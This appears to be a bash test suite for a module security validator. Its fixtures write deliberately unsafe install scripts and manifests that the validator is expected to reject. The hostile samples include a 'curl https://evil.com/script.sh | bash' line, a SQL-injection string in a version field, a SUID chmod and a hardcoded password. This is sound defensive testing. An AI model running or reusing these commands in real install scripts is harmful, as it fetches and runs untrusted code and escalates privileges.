#!/bin/bash
#===============================================================================
# Module Security Validation Test Suite
# Tests the module-validator.sh security validation functionality
#===============================================================================

# NOTE: We don't use 'set -e' here because tests are expected to fail
# The test framework handles failures explicitly
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$SCRIPT_DIR/../scripts/lib"

# Source required libraries
source "$LIB_DIR/common.sh"
source "$LIB_DIR/module-validator.sh"

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Test temp directory
TEST_TEMP_DIR=""

#===============================================================================
# TEST FRAMEWORK
#===============================================================================

# Setup test environment
setup_tests() {
    TEST_TEMP_DIR=$(mktemp -d)
    log_info "Test environment created: $TEST_TEMP_DIR"
}

# Cleanup test environment
cleanup_tests() {
    if [[ -n "$TEST_TEMP_DIR" ]] && [[ -d "$TEST_TEMP_DIR" ]]; then
        rm -rf "$TEST_TEMP_DIR"
        log_info "Test environment cleaned up"
    fi
}

# Run a test
# Usage: run_test "test_name" "test_function"
run_test() {
    local test_name="$1"
    local test_function="$2"

    ((TESTS_RUN++))

    echo ""
    log_info "===================================="
    log_info "Running test: $test_name"
    log_info "===================================="

    if $test_function; then
        ((TESTS_PASSED++))
        log_success "PASSED: $test_name"
    else
        ((TESTS_FAILED++))
        log_error "FAILED: $test_name"
    fi
}

# Assert that a command succeeds
assert_success() {
    local description="$1"
    shift

    if "$@"; then
        log_success "  ✓ $description"
        return 0
    else
        log_error "  ✗ $description"
        return 1
    fi
}

# Assert that a command fails
assert_failure() {
    local description="$1"
    shift

    if ! "$@"; then
        log_success "  ✓ $description (correctly failed)"
        return 0
    else
        log_error "  ✗ $description (should have failed)"
        return 1
    fi
}

#===============================================================================
# TEST: Dangerous Pattern Detection
#===============================================================================

test_dangerous_patterns() {
    local test_dir="$TEST_TEMP_DIR/dangerous_module"
    mkdir -p "$test_dir"

    # Create module manifest
    cat > "$test_dir/module.yaml" <<EOF
module:
  name: dangerous_test
  version: 1.0.0
  description: Test module with dangerous patterns

exporter:
  port: 9999
EOF

    # Create install script with dangerous pattern
    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail

# This should be detected as dangerous
curl -s https://evil.com/script.sh | bash

echo "Installation complete"
EOF

    chmod +x "$test_dir/install.sh"

    # This should fail due to dangerous pattern
    assert_failure "Detects curl | bash pattern" \
        scan_script_for_dangerous_patterns "$test_dir/install.sh" "install.sh"
}

#===============================================================================
# TEST: Checksum Verification Requirement
#===============================================================================

test_checksum_verification() {
    local test_dir="$TEST_TEMP_DIR/no_checksum_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: no_checksum
  version: 1.0.0
  description: Module without checksum verification

exporter:
  port: 9998
EOF

    # Create install script that downloads without verification
    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail

wget -q https://example.com/exporter.tar.gz
tar xzf exporter.tar.gz

echo "Installation complete"
EOF

    chmod +x "$test_dir/install.sh"

    # This should fail because it downloads without using download_and_verify
    assert_failure "Detects downloads without verification" \
        validate_install_script "no_checksum" "$test_dir/install.sh"
}

#===============================================================================
# TEST: Valid Module
#===============================================================================

test_valid_module() {
    local test_dir="$TEST_TEMP_DIR/valid_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: valid_test
  version: 1.0.0
  description: Valid test module

exporter:
  port: 9997
EOF

    # Create a valid install script
    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail

MODULE_NAME="${MODULE_NAME:-test_exporter}"
MODULE_VERSION="${MODULE_VERSION:-1.0.0}"
BINARY_NAME="test_exporter"
INSTALL_PATH="/usr/local/bin/$BINARY_NAME"

install_binary() {
    log_info "Installing $MODULE_NAME v$MODULE_VERSION..."

    # SECURITY: Download with checksum verification
    local archive_name="${BINARY_NAME}-${MODULE_VERSION}.tar.gz"
    local download_url="https://github.com/example/test_exporter/releases/download/v${MODULE_VERSION}/${archive_name}"
    local checksum_url="https://github.com/example/test_exporter/releases/download/v${MODULE_VERSION}/checksums.txt"

    if ! download_and_verify "$download_url" "$archive_name" "$checksum_url"; then
        log_error "SECURITY: Checksum verification failed"
        return 1
    fi

    tar xzf "$archive_name"
    cp test_exporter "$INSTALL_PATH"

    # SECURITY: Safe file operations
    safe_chmod 755 "$INSTALL_PATH" "test_exporter binary"
    safe_chown "root:root" "$INSTALL_PATH"

    log_success "$MODULE_NAME installed"
}

install_binary
EOF

    chmod +x "$test_dir/install.sh"
    chmod 644 "$test_dir/module.yaml"

    # This should pass all checks
    assert_success "Validates secure install script" \
        validate_install_script "valid_test" "$test_dir/install.sh"

    assert_success "Validates module manifest" \
        validate_module_manifest "valid_test" "$test_dir/module.yaml"
}

#===============================================================================
# TEST: Hardcoded Credentials
#===============================================================================

test_hardcoded_credentials() {
    local test_dir="$TEST_TEMP_DIR/hardcoded_creds_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: hardcoded_creds
  version: 1.0.0
  description: Module with hardcoded credentials

exporter:
  port: 9996
EOF

    # Create install script with hardcoded password
    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail

# This is a security issue - hardcoded password
DB_PASSWORD="super_secret_password_123"

echo "Setting up with password: $DB_PASSWORD"
EOF

    chmod +x "$test_dir/install.sh"

    # This should generate warnings about hardcoded credentials
    # Note: We check the output contains warning
    local output
    output=$(validate_install_script "hardcoded_creds" "$test_dir/install.sh" 2>&1 || true)

    if echo "$output" | grep -qi "credential"; then
        log_success "  ✓ Detects hardcoded credentials"
        return 0
    else
        log_error "  ✗ Failed to detect hardcoded credentials"
        return 1
    fi
}

#===============================================================================
# TEST: World-Writable Files
#===============================================================================

test_world_writable_files() {
    local test_dir="$TEST_TEMP_DIR/world_writable_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: world_writable
  version: 1.0.0
  description: Module with world-writable files

exporter:
  port: 9995
EOF

    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail
echo "test"
EOF

    # Make files world-writable (security issue)
    chmod 777 "$test_dir/install.sh"
    chmod 666 "$test_dir/module.yaml"

    # This should fail due to world-writable files
    assert_failure "Detects world-writable install script" \
        validate_install_script "world_writable" "$test_dir/install.sh"

    assert_failure "Detects world-writable manifest" \
        validate_module_manifest "world_writable" "$test_dir/module.yaml"
}

#===============================================================================
# TEST: Invalid Version Format
#===============================================================================

test_invalid_version() {
    local test_dir="$TEST_TEMP_DIR/invalid_version_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: invalid_version
  version: "1.0'; DROP TABLE users; --"
  description: Module with malicious version

exporter:
  port: 9994
EOF

    chmod 644 "$test_dir/module.yaml"

    # This should fail due to invalid version format
    assert_failure "Detects invalid version format" \
        validate_module_manifest "invalid_version" "$test_dir/module.yaml"
}

#===============================================================================
# TEST: Invalid Port
#===============================================================================

test_invalid_port() {
    local test_dir="$TEST_TEMP_DIR/invalid_port_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: invalid_port
  version: 1.0.0
  description: Module with invalid port

exporter:
  port: 99999
EOF

    chmod 644 "$test_dir/module.yaml"

    # This should fail due to invalid port
    assert_failure "Detects invalid port number" \
        validate_module_manifest "invalid_port" "$test_dir/module.yaml"
}

#===============================================================================
# TEST: Privilege Escalation Patterns
#===============================================================================

test_privilege_escalation() {
    local test_dir="$TEST_TEMP_DIR/privesc_module"
    mkdir -p "$test_dir"

    cat > "$test_dir/module.yaml" <<EOF
module:
  name: privesc
  version: 1.0.0
  description: Module with privilege escalation

exporter:
  port: 9993
EOF

    # Create install script with SUID manipulation
    cat > "$test_dir/install.sh" <<'EOF'
#!/bin/bash
set -euo pipefail

# This should be detected as dangerous
chmod u+s /usr/local/bin/malicious_binary

echo "Installation complete"
EOF

    chmod +x "$test_dir/install.sh"

    # This should fail due to SUID pattern
    assert_failure "Detects SUID manipulation" \
        scan_script_for_dangerous_patterns "$test_dir/install.sh" "install.sh"
}

#===============================================================================
# TEST: Symlink Detection
#===============================================================================

test_symlink_detection() {
    local test_dir="$TEST_TEMP_DIR/symlink_module"
    local real_dir="$TEST_TEMP_DIR/real_module"

    mkdir -p "$real_dir"

    cat > "$real_dir/module.yaml" <<EOF
module:
  name: symlink_test
  version: 1.0.0
  description: Real module

exporter:
  port: 9992
EOF

    cat > "$real_dir/install.sh" <<'EOF'
#!/bin/bash
echo "test"
EOF

    # Create symlink to real directory
    ln -s "$real_dir" "$test_dir"

    # This should fail because module directory is a symlink
    assert_failure "Detects symlink module directory" \
        validate_module_structure "symlink_test" "$test_dir"
}

#===============================================================================
# MAIN TEST EXECUTION
#===============================================================================

main() {
    log_info "=========================================="
    log_info "Module Security Validation Test Suite"
    log_info "=========================================="

    setup_tests
    trap cleanup_tests EXIT

    # Run all tests
    run_test "Dangerous Pattern Detection" test_dangerous_patterns
    run_test "Checksum Verification Requirement" test_checksum_verification
    run_test "Valid Module" test_valid_module
    run_test "Hardcoded Credentials Detection" test_hardcoded_credentials
    run_test "World-Writable Files Detection" test_world_writable_files
    run_test "Invalid Version Format" test_invalid_version
    run_test "Invalid Port Number" test_invalid_port
    run_test "Privilege Escalation Detection" test_privilege_escalation
    run_test "Symlink Detection" test_symlink_detection

    # Print summary
    echo ""
    log_info "=========================================="
    log_info "Test Summary"
    log_info "=========================================="
    log_info "Tests run:    $TESTS_RUN"
    log_success "Passed:       $TESTS_PASSED"

    if [[ $TESTS_FAILED -gt 0 ]]; then
        log_error "Failed:       $TESTS_FAILED"
        log_error "=========================================="
        exit 1
    else
        log_info "Failed:       $TESTS_FAILED"
        log_success "=========================================="
        log_success "All tests passed!"
        exit 0
    fi
}

main "$@"
